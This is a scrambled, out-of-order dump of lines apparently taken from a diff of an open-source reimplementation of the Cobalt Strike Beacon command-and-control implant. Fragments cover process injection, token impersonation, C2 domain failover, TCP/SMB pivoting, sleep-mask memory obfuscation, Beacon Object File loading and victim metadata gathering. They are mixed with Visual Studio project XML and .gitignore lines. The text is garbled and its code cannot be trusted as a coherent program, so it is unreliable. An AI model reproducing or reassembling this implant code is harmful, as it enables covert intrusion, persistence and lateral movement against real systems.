@@ -1,0 +1,5066 @@
+    
+        
+            
+                                               gChannelBuffer 
+                                       char
+                              int a_len)
+                    BeaconErrorNA(ERROR_NO_SLOT_FOR_FUNCTION)
+                    false: beacon_ptr = allocated_buffer (A valid address)
+                    forceFailover = TRUE
+                    goto cleanup
+                    hModule = LoadLibraryA(lpModuleName)
+                    true:  beacon_ptr = allocated_buffer - 0x1000 (Not a valid address)
+                 A section is denoted by a pair indicating the start and end offset values.
+                 For a UDRL the beacon_ptr will be set to the 1st argument to DllMain
+                 The list is terminated by the HEAP_RECORD.ptr set to NULL.
+                 The list is terminated by the start and end offset values of 0 and 0.
+                 The stage.obfuscate flag affects this value when using CS default loader.
+                 from the beacon_ptr and the start value is aligned on 0x1000 boundary.
+                 when the 2nd argument is set to DLL_PROCESS_ATTACH.
+                // BOF Dynamic function
+                // BOF Internal function
+                HMODULE hModule = GetModuleHandleA(lpModuleName)
+                PROC
+                char
+                dynamicFunctionPtr = (PROC
+                dynamicFunctionPtr = dynamicFunction
+                forceFailover = TRUE
+                gBaseTimestamp = time(NULL)
+                if (!dynamicFunction)
+                if (!hModule)
+                if (!lpProc)
+                if (currentTimestamp > baseTimestamp 
+                strategy.failSeconds = gStrategy.failSeconds
+                {
+                }
+            BeaconErrorNA(ERROR_RELOCATION_TRUNCATED_TO_FIT)
+            else
+            gDomainIndex = tmp < gFailoverCount 
+            gFailoverAttempts = 0
+            gFailoverDomains[gFailoverCount
+            gFailoverStart = time(NULL)
+            goto cleanup
+            if (baseTimestamp)
+            if (gFailoverAttempts > strategy.failX)
+            if (relocation->sof.function != DYNAMIC_FUNC_RELOC)
+            int tmp = gDomainIndex 
+            return FALSE
+            {
+            }
+          memory address.
+        // Calculate the number of bytes to be written in the current iteration
+        // Check if the difference is too big to fit in a 32-bit signed integer
+        // Check if the write operation was successful
+        BOOL success
+        baseTimestamp = 0
+        baseTimestamp = gBaseTimestamp
+        const int domainsLength = strlen(domains) 
+        else
+        else if (relocation->sof.section == DATA_SECTION_RELOC)
+        else if (relocation->sof.section == EXE_SECTION_RELOC)
+        for (char
+        gBaseTimestamp = 0
+        gDomainIndex = 0
+        gFailoverAttempts = 0
+        gFailoverCount = 0
+        gFailoverDomainsStr = malloc(domainsLength)
+        gFailoverStart = time(NULL)
+        gIsFailoverActive = FALSE
+        gIsFailoverActive = TRUE
+        gStrategy = strategy
+        if (!success)
+        if (diff 
+        if (forceFailover 
+        if (relocation->sof.section == RDATA_SECTION_RELOC)
+        if (strategy.failSeconds >= 0)
+        if (strategy.failX >= 0) {
+        relocation = (RELOCATION
+        relocation->sof.section != MULTI_RELOC
+        return FALSE
+        short function
+        short section
+        strategy = gStrategy
+        {
+        }
+      <AdditionalIncludeDirectories>$(SolutionDir)libtomcrypt
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+      <Configuration>Debug</Configuration>
+      <Configuration>Release</Configuration>
+      <ConformanceMode>true</ConformanceMode>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <ExceptionHandling>false</ExceptionHandling>
+      <Extensions>cpp
+      <Extensions>h
+      <Extensions>rc
+      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <FileType>CppCode</FileType>
+      <Filter>Header Files</Filter>
+      <Filter>Source Files</Filter>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <LanguageStandard>stdcpp20</LanguageStandard>
+      <LanguageStandard_C>stdc17</LanguageStandard_C>
+      <Optimization>MinSpace</Optimization>
+      <OptimizeReferences>true</OptimizeReferences>
+      <Platform>Win32</Platform>
+      <Platform>x64</Platform>
+      <PrecompiledHeader>Use</PrecompiledHeader>
+      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
+      <PreprocessorDefinitions>NDEBUG
+      <PreprocessorDefinitions>WIN32
+      <PreprocessorDefinitions>_DEBUG
+      <Project>{e3802982-dcb6-4d85-a2bd-6b08f0657e79}</Project>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
+      <SDLCheck>false</SDLCheck>
+      <SubSystem>Console</SubSystem>
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <WarningLevel>Level3</WarningLevel>
+     /
+    ((void(
+    - The contents at the memory address is not masked by beacon.
+    - The contents at the memory address is not released by beacon.
+    // Call the entry point whose signature is void go(char
+    // Check if size is greater than 0
+    // This is for the BOF to be able to call Win32 APIs
+    //Clean version:
+    1/25/2022: updated for 4.5
+    7/18/2023: Added BeaconInformation API for 4.9
+    7/31/2023: Added Key/Value store APIs for 4.9
+    8/31/2023: Added Data store APIs for 4.9
+    9/01/2023: Added BeaconGetCustomUserData API for 4.9
+    </ClCompile>
+    </ClInclude>
+    </Filter>
+    </Link>
+    </ProjectConfiguration>
+    </ProjectReference>
+    <CharacterSet>NotSet</CharacterSet>
+    <ClCompile>
+    <ConfigurationType>Application</ConfigurationType>
+    <GenerateManifest>false</GenerateManifest>
+    <IntDir>$(SolutionDir)int
+    <Keyword>Win32Proj</Keyword>
+    <Link>
+    <LinkIncremental>false</LinkIncremental>
+    <OutDir>$(SolutionDir)out
+    <PlatformToolset>v143</PlatformToolset>
+    <ProjectGuid>{95502b5e-5763-4ec5-a64c-1e9e33409e2f}</ProjectGuid>
+    <RootNamespace>Beacon</RootNamespace>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <VCProjectVersion>17.0</VCProjectVersion>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+    BeaconDataLengthAndString(datap 
+    BeaconDataStoreGetItem returns NULL if the index does not exist.
+    DWORD wrote
+    PROC
+    These functions are used to access items in Beacon's Data Store.
+    These functions are used to associate a key to a memory address and save
+    after the data is not used anymore.
+    before accessing the data buffer. BOFs must also protect the entry
+    bool forceFailover = false
+    cleanup:
+    const char
+    const time_t currentTimestamp = time(NULL)
+    const unsigned long long diff = 
+    do { 
+    else
+    else if (
+    else if (!IS_X64() 
+    else if (!gIsFailoverActive)
+    for (DWORD totalWrote = 0
+    for (RELOCATION
+    free(api)
+    git clone https://github.com/ElJaviLuki/CobaltStrike_OpenBeacon.git
+    if (
+    if (IS_X64() 
+    if (S_MAX_RETRY_STRATEGY_ATTEMPTS <= 0)
+    if (gFailoverDomainsStr)
+    if (gIsFailoverActive 
+    if (isConnectionFailed)
+    if (isConnectionStrategyFailed)
+    int
+    key - the key will be converted to a hash which is used to locate the
+    ptr - a memory address to save.
+    retrieved in a subsequent execution of a BOF.
+    return TRUE
+    return false
+    return gFailoverDomains[gDomainIndex 
+    return true
+    static BOOL gIsFailoverActive
+    static STRATEGY gStrategy
+    static char
+    static int gDomainIndex
+    static int gFailoverAttempts
+    static int gFailoverCount
+    static time_t gBaseTimestamp
+    static time_t gFailoverStart
+    that information into beacon.  These memory addresses can then be
+    time_t baseTimestamp
+    union {
+    {
+    }
+    } else if (!IS_X64() 
+    } sof
+    } while (0)
+   - https://github.com/Cobalt-Strike/bof_template
+   /
+   BeaconDataBuffer(datap
+   BeaconDataOriginal(datap
+   BeaconFormatBuffer(formatp
+   BeaconFormatOriginal(formatp
+  </ImportGroup>
+  </ItemDefinitionGroup>
+  </ItemGroup>
+  </PropertyGroup>
+  <ItemGroup>
+  BeaconDataAlloc(int size)
+  BeaconDataExtract(datap 
+  BeaconDataPtr(datap 
+  BeaconDataStringPointer(datap 
+  BeaconDataStringPointerCopy(datap 
+  BeaconFormatToString(formatp 
+  beacon_ptr   - pointer to beacon's base address
+  heap_records - list of memory addresses on the heap beacon wants to mask.
+  mask         - the mask that beacon randomly generated to apply
+  ptr  - pointer to the base address of the allocated memory.
+  sections     - list of memory sections beacon wants to mask. These are offset values
+  size - the number of bytes allocated for the ptr.
+  sleep_mask_ptr        - pointer to the sleep mask base address
+  sleep_mask_text_size  - the sleep mask text section size
+  sleep_mask_total_size - the sleep mask total memory size
+ !IsWow64ProcessEx(GetCurrentProcess()))
+ !RunIsSameSessionAsCurrent(gParentPid))
+ !forceFailover)
+ !gSpawnToX64)
+ !injection->isSameArchAsHostSystem 
+ !injection->isSameArchAsHostSystem)
+ !isHostHeaderStepDone)
+ !tools/packages.config
+ % 0x4000000
+ (UINT_MAX / 2 
+ (char)(in[j 
+ (gIsFailoverActive 
+ (gRecordCapacity 
+ (heapCount 
+ (https://github.com/github/gitignore/pull/1529
+ (https://github.com/github/gitignore/pull/2483
+ (long long)GetProcAddress >> 32 : 0)
+ (long)(pSection 
+ (now.wMonth 
+ (strategy.seconds >= 0 
+ (unsigned long long)(pSection 
+ -------------------------
+ .NET Core
+ // 1 = non-blocking
+ // AES random
+ // ANSI code page
+ // Beacon ID
+ // Flags
+ // GetModuleHandleA address
+ // GetProcAddress address
+ // GetProcAddress high part for x64 addressing
+ // IPv4 address
+ // Magic number for metadata
+ // Now this truncates to 32-bit safely
+ // OEM code page
+ // OS build number
+ // OS major version
+ // OS minor version
+ // PID
+ // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+ // Placeholder for packet size
+ // Port
+ // don't add this to the IE cache
+ // ignore common name invalid cert errors
+ // ignore date invalid cert errors
+ // means: don't show the window
+ // means: use the following handles and show the window
+ // no cookie popup
+ // null terminate
+ // relocation type - r_type
+ // the newline is 
+ // use PCT/SSL if applicable (HTTP)
+ // use keep-alive semantics
+ //value of the symbol - e_value
+ //virtual address of the item to be relocated - r_vaddr
+ 0 : 1)]
+ 0x0F) 
+ 0x1a8)
+ 0x20000 : 0))
+ 0x2c8)
+ 1 >= gRecordCapacity)
+ 1) > UINT_MAX)
+ 1) {
+ 1))
+ 1. Precompiled header
+ 100 
+ 1024
+ 15000
+ 16)
+ 1] - nb)
+ 1] = (char)(in[i] 
+ 1] == '
+ 2. Relocations
+ 3. C standard library headers
+ 3. Symbols (hierarchy)
+ 30000
+ 3500
+ 4. Third-party library headers
+ 5. Windows headers
+ 60000
+ @brief Adjusts the command line of a process by replacing it with a new one.
+ @brief Gets the spawn path based on the architecture.
+ @param buffer A pointer to the buffer where the spawn path will be stored.
+ @param buffer The buffer to store the username.
+ @param hToken The handle to the token.
+ @param length The size of the buffer in bytes.
+ @param size The size of the buffer.
+ @param token The handle to the token to be used.
+ @param x86 Flag indicating whether the architecture is x86 (TRUE) or x64 (FALSE).
+ A Beacon Object File is a light-weight post exploitation tool that runs
+ ASP.NET Scaffolding
+ Additional BOF resources are available here:
+ Apply the specified token as Beacon's current thread token.
+ ArgumentFindMatch(
+ ArgumentFindOrCreate(char
+ AxoCover is a Code Coverage Tool
+ Azure Stream Analytics local run output
+ Backup 
+ Backup folder for Package Reference Convert tool in Visual Studio 2017
+ Beacon Data Store functions
+ Beacon Information 
+ Beacon Object Files (BOF)
+ Beacon User Data functions 
+ BeaconDataAlloc(int size)
+ BeaconDataBuffer(datap
+ BeaconDataExtract(datap
+ BeaconDataLengthAndString(datap
+ BeaconDataOriginal(datap
+ BeaconDataPtr(
+ BeaconDataPtr(datap
+ BeaconDataStringPointer(datap
+ BeaconDataStringPointerCopy(datap
+ BeaconFormatBuffer(formatp
+ BeaconFormatOriginal(formatp
+ BeaconFormatToString(formatp
+ BeaconGetCustomUserData()
+ BeaconGetValue(const char 
+ BeatPulse healthcheck temp database
+ Benchmark Results
+ BizTalk build output
+ Block)
+ Build Results of an ATL Project
+ Build results
+ Business Intelligence projects
+ CHAR
+ CREATE_NO_WINDOW 
+ CREATE_SUSPENDED) != 0 
+ Cake - Uncomment if you are using it
+ ChangeLog:
+ Checks if the current user running the code has administrative privileges.
+ Chutzpah Test files
+ Click-Once directory
+ Cobalt Strike 4.x
+ Cobalt Strike Beacon Open Source Implementation
+ CodeRush personal settings
+ Considerations:
+ Contributing
+ Convert binary document formats to text before diffing them. This feature
+ CreateProcessWithLogonW 
+ CreateProcessWithLogonW)
+ CreateProcessWithTokenW)
+ DUPLICATE_CLOSE_SOURCE)
+ Disclaimer
+ DocProject is a documentation generator add-in
+ DotCover is a Code Coverage Tool
+ Drops the current thread token.
+ FAKE - F
+ FILE_ATTRIBUTE_DIRECTORY
+ FILE_ATTRIBUTE_DIRECTORY)
+ FN_KERNEL32_LOADLIBRARYA)(_In_ LPCSTR lpLibFileName)
+ Files built by Visual Studio
+ Files/
+ FindOrAddDynamicFunction(bapi
+ Fody - auto-generated XML schema
+ Get latest from https://github.com/github/gitignore/blob/master/VisualStudio.gitignore
+ GetLastError() != ERROR_PIPE_CONNECTED)
+ GetTickCount() < timeout) {}
+ GetTickCount() >= timeout)
+ Getting Started
+ GhostDoc plugin setting file
+ Guidance Automation Toolkit
+ HINT_PROTO_TCP 
+ HINT_REVERSE)
+ IFF_LOOPBACK) 
+ IFF_UP)
+ Include convention for this project:
+ Including strong name files can present a security risk
+ InjectLocally(char
+ InjectRemotely(INJECTION
+ Installshield output folder
+ Ionide (cross platform F
+ IsWow64ProcessEx(GetCurrentProcess()))
+ IsWow64ProcessEx(GetCurrentProcess())) {
+ JobAdd(JOB_ENTRY
+ JobRegisterProcess(PROCESS_INFORMATION
+ Key/Value store functions
+ License
+ Local History for Visual Studio
+ MASK_SIZE
+ MASK_SIZE] 
+ MASK_SIZE] = in[i] 
+ MAX_ARGS 
+ MAX_BUFFER)
+ MAX_CMD)
+ MAX_COMPUTER_NAME 
+ MAX_DST)
+ MAX_EXPANDED 
+ MAX_EXPANDED_CMD 
+ MAX_EXPANDED_FULL)
+ MAX_FILE_NAME)
+ MAX_INFO 
+ MAX_NEW_FILENAME)
+ MAX_PASSWORD)
+ MAX_SPAWN_TO_X64)
+ MAX_URI 
+ MAX_URI_PARAMS 
+ MAX_USERNAME 
+ MAX_USER_NAME 
+ METADATA_FLAG_X64_SYSTEM
+ MFractors (Xamarin productivity tool) working folder
+ MSBuild Binary and Structured Log
+ MSTest test Results
+ Make
+ MemoryGetHeapRecords()
+ Merging from the command prompt will add diff markers to the files if there
+ Microsoft Azure Build Output
+ Microsoft Azure Emulator
+ Microsoft Azure Web App publish settings. Comment the next line if you want to
+ Microsoft Fakes
+ MightyMoose
+ Mono auto generated files
+ NCrunch
+ NUnit
+ NVidia Nsight GPU debugger configuration file
+ Node.js Tools for Visual Studio
+ Note: This is only used by command line
+ NuGet Packages
+ NuGet Symbol Packages
+ NuGet v3's project.json files produces more ignorable files
+ OldValue)
+ OpenCover UI analysis results
+ Others
+ Output Functions 
+ Overview
+ PAPC_ROUTINE_CONTEXT
+ PCLIENT_ID
+ PIVOT_HINT_PROTO_TCP)
+ PROCESS_QUERY_INFORMATION 
+ PROCESS_VM_OPERATION 
+ PROCESS_VM_WRITE 
+ PROTOCOL_HTTPS)
+ PRUN_UNDER_CONTEXT
+ PSECTION_INHERIT
+ Paket dependency manager
+ PowershellImport(char
+ Prerequisites
+ ProtocolHeaderGet(char
+ ProtocolSmbInit(PROTOCOL
+ ProtocolTcpInit(PROTOCOL
+ Publish Web Output
+ Python Tools for Visual Studio (PTVS)
+ RECORD_CAPACITY_INCREMENT)
+ RECORD_CAPACITY_INCREMENT))
+ RIA/Silverlight projects
+ ReSharper is a .NET coding add-in
+ Retrieves the username associated with the given token handle.
+ SEM_FAILCRITICALERRORS)
+ SEM_NOGPFAULTERRORBOX 
+ SQL Server files
+ STARTF_USESHOWWINDOW
+ STARTF_USESTDHANDLES
+ S_HOST_HEADER : param)
+ S_MAX_RETRY_STRATEGY_DURATION)
+ S_PROXY_BEHAVIOR == PROXY_MANUAL_CREDS)
+ Set default behavior for command prompt diff.
+ Set default behavior to automatically normalize line endings.
+ Set the merge driver for project and solution files
+ Sets the token for the current thread and reports the new token to the user.
+ Spawn
+ StrategyPickDomain(
+ StyleCop
+ TFS 2012 Local Workspace
+ Tabs Studio
+ TeamCity is a build add-in
+ Telerik's JustMock configuration file
+ The packages folder can be ignored because of Package Restore
+ The result is stored in the provided buffer after expanding any environment variables.
+ This function cleans up other state information about the token as well.
+ This function retrieves the spawn path depending on the architecture (x86 or x64).
+ This is need for earlier builds of msysgit that does not have it on by
+ Token Functions 
+ Uncomment if necessary however generally it will be regenerated when needed
+ Uncomment if you have tasks that create the project's static files in wwwroot
+ Use this over direct calls to RevertToSelf().
+ User-specific files
+ User-specific files (MonoDevelop/Xamarin Studio)
+ Utility Functions 
+ VS Code tools) working folder
+ Visual C
+ Visual Studio 2015/2017 cache/options directory
+ Visual Studio 2017 auto generated files
+ Visual Studio 6 auto-generated workspace file (contains which files were open etc.)
+ Visual Studio 6 build log
+ Visual Studio 6 workspace options file
+ Visual Studio LightSwitch build output
+ Visual Studio Trace Files
+ Visual Studio Version 17
+ Visual Studio cache files
+ Visual Studio code coverage results
+ Visual Studio profiler
+ WOW64DISABLEWOW64FSREDIRECTION)(PVOID
+ WOW64REVERTWOW64FSREDIRECTION)(PVOID OldValue)
+ Web workbench (sass)
+ Windows Store app package directories and files
+ Wow64Process
+ after = substr 
+ allocate memory in the target process 
+ append = BeaconDataPtr(
+ appendSize 
+ appendSize)
+ arch
+ argument
+ argument = ArgumentFindOrCreate(expanded)
+ argument = argumentLength 
+ argv[])
+ attempts
+ attempts < MAX_ATTEMPTS
+ b = BeaconDataBuffer(
+ beaconApi)
+ beacon_ptr
+ because we have git 
+ behavior for image files
+ block))
+ body
+ buf = BeaconDataBuffer(
+ buffer
+ buffer = (char
+ buffer = BeaconDataOriginal(
+ buffer = malloc(MAX_BUFFER)
+ but database connection strings (with potential passwords) will be unencrypted
+ but keep track of directories ending in .cache
+ bytes = BeaconDataLengthAndString(
+ bytesAvailable < maxGet)
+ bytesRead == 0)
+ cache files
+ callback)(void
+ callbackData
+ cbBuffer = BeaconDataOriginal(
+ cbData = BeaconFormatOriginal(
+ ch = (CHANNEL_ENTRY
+ ch = gChannels
+ channel
+ channel = channel->next)
+ channel = gChannels
+ channel = prev->next)
+ channel->id == channelId)
+ channel->port == port)
+ channel->type != CHANNEL_TYPE_BIND)
+ channel->type == CHANNEL_TYPE_BIND 
+ channel->type == CHANNEL_TYPE_TCP_PIVOT)
+ check if the file mapping object was created 
+ check if the function was found 
+ check if the memory was allocated 
+ childContext.updateProcessAttributes(
+ cleanup)(const struct _RUN_UNDER_CONTEXT
+ cleanupCallback)(void
+ cmd
+ cmd)
+ cmds) {
+ code = BeaconDataLengthAndString(
+ content
+ content = BeaconDataBuffer(
+ copiedDomains = malloc(strlen(domains) 
+ create a file mapping object 
+ current != NULL
+ current = current->next)
+ current = gArguments
+ current pointer into our buffer 
+ current->isActive)
+ currentDirectory)
+ currentFunction = 
+ currentPid)
+ currentTimestamp > gFailoverStart 
+ data
+ data = BeaconDataBuffer(
+ data = BeaconDataLengthAndString(
+ data = BeaconDataOriginal(
+ data = BeaconDataPtr(
+ data = BeaconFormatOriginal(
+ data = parser->buffer
+ data API - unpacks data 
+ data)
+ dataSize > length)
+ data[x 
+ data[x] == '
+ default for csharp files.
+ description)
+ determine the minimum allocation size based on S_PROCINJ_MINALLOC 
+ diff behavior for common document formats
+ domain
+ download
+ download = download->next)
+ download = gDownloads
+ download = malloc(sizeof(DOWNLOAD_ENTRY))
+ download)
+ dst
+ dynamicFunctionPtr
+ entries below.
+ entry = 
+ execution)
+ execution->ignoreToken)
+ expanded = malloc(MAX_EXPANDED)
+ expanded)
+ file
+ file == NULL)
+ file based on the provided template. Make sure to include your C2 Profile macros and configurations.
+ file extensions to fail to load in VS. An alternative would be to treat
+ filename = malloc(MAX_FILENAME)
+ filename)
+ filepath = BeaconDataStringPointerCopy(
+ filepath)
+ files ending in .cache can be ignored
+ files generated by popular Visual Studio add-ons.
+ finalAddress = processAddress 
+ findData)
+ format API - packs data 
+ format)
+ fullCmd
+ gArguments = NULL
+ gChannelBuffer
+ gChannelIdCount
+ gChannels
+ gCopiedDefaultDomains
+ gDownloadChunk
+ gDownloads = NULL
+ gFailoverDomainsStr
+ gFailoverDomains[200]
+ gHeapRecords
+ gHeapRecords)
+ gIdentityCredentialsParser
+ gIdentityDomain
+ gIdentityIsLoggedIn == TRUE)
+ gIdentityPassword
+ gIdentityUsername
+ gImportedPshScript
+ gJobs = NULL
+ gLinks[i].bid == bid)
+ gLinks[i].isOpen == FALSE)
+ gPostBuffer = NULL
+ gRandomDomainsArray
+ gRandomTokenArray[200]
+ gRecords
+ gRouteAux = NULL
+ gSelectedRandomDomainIndex >= gRandomTokenCount)
+ gSpawnToX64 = NULL
+ gSpawnToX86 = NULL
+ get the address of the NtMapViewOfSection function 
+ get the handle to the ntdll module 
+ get the startup information of the current process 
+ hSnapshot == NULL 
+ header
+ header = BeaconDataPtr(
+ headerSize - sizeof(int))
+ headerSize > size)
+ headers
+ heap_records
+ host = gethostbyname(target)
+ i < MAX_LINKS
+ i < gRecordCount
+ i < inlen
+ i < inlen 
+ i < numInterfaces
+ i < numPrivileges
+ i < raw_inlen
+ i<gRecordCount
+ image files are treated as binary by default.
+ in these scripts will be unencrypted
+ in)
+ in[i % MASK_SIZE]
+ index < MAX_DYNAMIC_FUNCTIONS
+ info)
+ injection->isSameArchAsHostSystem)
+ injection->isTemporary)
+ interfaceInfo[i].iiFlags 
+ is only available from the command line. Turn it on by uncommenting the 
+ isHeap
+ j < outlen
+ job
+ job = 
+ job = (JOB_ENTRY
+ job = JobRegisterProcess(
+ job = gJobs
+ job = job->next)
+ key)
+ lHostent = gethostbyname(buffer)
+ length <= 256)
+ locals = BeaconDataAlloc(0x4C00)
+ locals = BeaconDataAlloc(MAX_CMD)
+ locals = BeaconDataAlloc(MAX_DESCRIPTION)
+ locals = BeaconDataAlloc(MAX_DOMAIN 
+ locals = BeaconDataAlloc(MAX_EXISTING_FILENAME 
+ locals = BeaconDataAlloc(MAX_FILENAME 
+ locals = BeaconDataAlloc(MAX_ORIGINAL 
+ locals = BeaconDataAlloc(MAX_RUNNABLE_CMD 
+ locals = BeaconDataAlloc(MAX_SRC 
+ locals)
+ lpCurrentDirectory = NULL
+ lpFileName
+ lpFileName = malloc(0x400)
+ lpFileNameInternal = malloc(MAX_FILENAME)
+ lpModuleName
+ lpModuleName = BeaconDataStringPointer(
+ lpPathName = (char
+ lpProcName
+ lpProcName = BeaconDataStringPointer(
+ lpProcessInfo)
+ maskedPayload = (PAYLOAD
+ maskedPayload->mzSignature == IMAGE_DOS_SIGNATURE 
+ maskedPayload->smartInjectMagic == 0xF4F4F4F4)
+ mode)
+ newChannel = malloc(sizeof(CHANNEL_ENTRY))
+ newCmd = malloc(commandLine.MaximumLength)
+ newJob)
+ next
+ now.wYear)
+ offsetInSection)
+ offsetInSection) - (long)(img 
+ offsetInSection) - (unsigned long long)(img 
+ once you're done with the format... 
+ openLink = NULL
+ ordinal
+ original
+ out[i % MASK_SIZE]
+ outlen)
+ pAlloc = (char
+ pHeaderLength)
+ pInfo)
+ pLen 
+ pNext
+ pPacketSize = (u_long
+ pProtocol = 
+ packed = BeaconDataBuffer(
+ parameter
+ parameter)
+ parentContext.updateProcessAttributes(
+ parser
+ parser = (datap
+ parser = BeaconDataAlloc(0xA000)
+ parser = BeaconDataAlloc(MAX_HEADERS 
+ parser = BeaconDataAlloc(MAX_SPAWN_TO_X86 
+ parser = BeaconDataAlloc(sizeof(OSVERSIONINFOA) 
+ parser)
+ password)
+ path = BeaconDataStringPointerCopy(
+ payload = BeaconDataBuffer(
+ payloadSize
+ peb = (PEB
+ pipe)
+ position != (char
+ potentialFuncLocation = NULL
+ prepend = BeaconDataPtr(
+ prev = NULL
+ priorSleepTime)
+ processAddress = (BYTE
+ processInfo
+ processInfo->hThread : NULL
+ protocol)
+ ptr
+ ptr)
+ rand() % (max - min 
+ rdata = BeaconDataLengthAndString(
+ read != sizeof(APC_ROUTINE_CONTEXT))
+ relocation = (RELOCATION
+ relocation->r_type < RELOC_UNK_10)
+ relocation->r_type == RELOC_ADDR32)
+ relocation->r_type == RELOC_REL32)
+ relocation->r_type)
+ relocation->r_vaddr 
+ relocation->r_vaddr) 
+ relocation->r_vaddr) = 
+ relocation->sof.function
+ relocations = BeaconDataLengthAndString(
+ remaining length of data 
+ report files from converting an old project file
+ runUnderConfig)
+ runUnderConfig->startupInfo->cb == sizeof(STARTUPINFOEXA) 
+ s1)
+ sb)
+ sections
+ si)
+ si->hStdError 
+ si->hStdOutput == si->hStdError)
+ size <= nSize 
+ size)
+ sizeof(WCHAR))
+ sizeof(gHmacKey)]
+ sizeof(int))
+ sizeof(int)))
+ sleep_mask_ptr
+ spawnData = BeaconDataBuffer(
+ spawnTo
+ startupInfo
+ step
+ step = BeaconDataInt(
+ strategy.failSeconds)
+ strategy.seconds)) {
+ strlen(S_HOST_HEADER) > 0
+ strlen(gSpawnToX64) == 0)
+ strlen(gSpawnToX86) == 0)
+ target
+ target = BeaconDataBuffer(
+ target = BeaconDataStringPointer(
+ temp
+ temp = malloc(recoverableLength)
+ text=auto
+ the diff markers are never inserted). Diff markers may cause the following 
+ the original buffer [so we can free it] 
+ these files as binary and thus will always conflict and require user
+ threadInfo)
+ tmp : 0
+ token
+ tools/
+ total 
+ total < dataLength
+ total < size
+ total size of this buffer 
+ totalHeaderRead != headerSize)
+ totalRead 
+ totalRead < length
+ totalWrote 
+ totalWrote < length
+ transform)
+ transform->outputLength 
+ transform->outputLength)
+ transformed
+ updateProcessAttributes)(struct _RUN_UNDER_CONTEXT
+ uri
+ uri = getUri
+ uri)
+ uriParams
+ waitTime
+ wdata
+ webResponse = malloc(sizeof(WEB_RESPONSE))
+ webResponse)
+ with Beacon's inline-execute command.
+ wrote != dwSize)
+!.axoCover/settings.json
+"                    BeaconErrorPrintf(ERROR_RESOLVE_API_FAILED, ""%s!%s"", lpModuleName, lpProcName)"
+"                    LERROR(""Could not resolve API %s!%s"", lpModuleName, lpProcName)"
+"                    LERROR(""No slot for function (reduce number of Win32 APIs called)"")"
+"                  BeaconAddValue, BeaconGetValue, and BeaconRemoveValue"
+"                  BeaconDataStoreGetItem, BeaconDataStoreProtectItem,"
+"                  BeaconDataStoreUnprotectItem, and BeaconDataStoreMaxEntries"
+"                FARPROC lpProc = GetProcAddress(hModule, lpProcName)"
+"            LERROR(""Relocation truncated to fit (distance between executable code and other data is >4GB)"")"
+"            success = ProcessRelocation(relocation, code, img, (char"
+"            success = ProcessRelocation(relocation, code, img, data, relocation->e_value)"
+"            success = ProcessRelocation(relocation, code, img, img, relocation->e_value)"
+"            success = ProcessRelocation(relocation, code, img, rdata, relocation->e_value)"
+"        BeaconErrorD(ERROR_UNIMPLEMENTED_RELOCATION_TYPE, relocation->r_type)"
+"        LERROR(""Un-implemented relocation type %d"", relocation->r_type)"
+"        const DWORD toWrite = min(length - totalWrote, 0x2000)"
+"        if (!WriteFile(hFile, buffer "
+"        printf("""
+"        printf(""%s%s "" ANSI_COLOR_RESET, color, label)"
+"        printf(format, "
+"        strncpy(gFailoverDomainsStr, domains, domainsLength)"
+"       ""Content-Length: %d"
+"       ""Content-Type: application/octet-stream"
+"      <PrecompiledHeader Condition=""'$(Configuration)"
+"    <ClCompile Include=""api.c"" />"
+"    <ClCompile Include=""api.c"">"
+"    <ClCompile Include=""argument.c"" />"
+"    <ClCompile Include=""argument.c"">"
+"    <ClCompile Include=""beacon.c"" />"
+"    <ClCompile Include=""beacon.c"">"
+"    <ClCompile Include=""channel.c"" />"
+"    <ClCompile Include=""channel.c"">"
+"    <ClCompile Include=""crypto.c"" />"
+"    <ClCompile Include=""crypto.c"">"
+"    <ClCompile Include=""data.c"" />"
+"    <ClCompile Include=""data.c"">"
+"    <ClCompile Include=""download.c"" />"
+"    <ClCompile Include=""download.c"">"
+"    <ClCompile Include=""filesystem.c"" />"
+"    <ClCompile Include=""filesystem.c"">"
+"    <ClCompile Include=""format.c"" />"
+"    <ClCompile Include=""format.c"">"
+"    <ClCompile Include=""identity.c"" />"
+"    <ClCompile Include=""identity.c"">"
+"    <ClCompile Include=""inline_execute_object.c"" />"
+"    <ClCompile Include=""inline_execute_object.c"">"
+"    <ClCompile Include=""job.c"" />"
+"    <ClCompile Include=""job.c"">"
+"    <ClCompile Include=""link.c"" />"
+"    <ClCompile Include=""link.c"">"
+"    <ClCompile Include=""main.c"" />"
+"    <ClCompile Include=""main.c"">"
+"    <ClCompile Include=""memory.c"" />"
+"    <ClCompile Include=""memory.c"">"
+"    <ClCompile Include=""metadata.c"" />"
+"    <ClCompile Include=""metadata.c"">"
+"    <ClCompile Include=""network.c"" />"
+"    <ClCompile Include=""network.c"">"
+"    <ClCompile Include=""pch.c"">"
+"    <ClCompile Include=""pipe.c"" />"
+"    <ClCompile Include=""pipe.c"">"
+"    <ClCompile Include=""powershell.c"" />"
+"    <ClCompile Include=""powershell.c"">"
+"    <ClCompile Include=""process.c"" />"
+"    <ClCompile Include=""process.c"">"
+"    <ClCompile Include=""protocol.c"" />"
+"    <ClCompile Include=""protocol.c"">"
+"    <ClCompile Include=""self.c"" />"
+"    <ClCompile Include=""self.c"">"
+"    <ClCompile Include=""spawn.c"" />"
+"    <ClCompile Include=""spawn.c"">"
+"    <ClCompile Include=""stage.c"" />"
+"    <ClCompile Include=""stage.c"">"
+"    <ClCompile Include=""strategy.c"" />"
+"    <ClCompile Include=""strategy.c"">"
+"    <ClCompile Include=""task.c"" />"
+"    <ClCompile Include=""task.c"">"
+"    <ClCompile Include=""thread.c"" />"
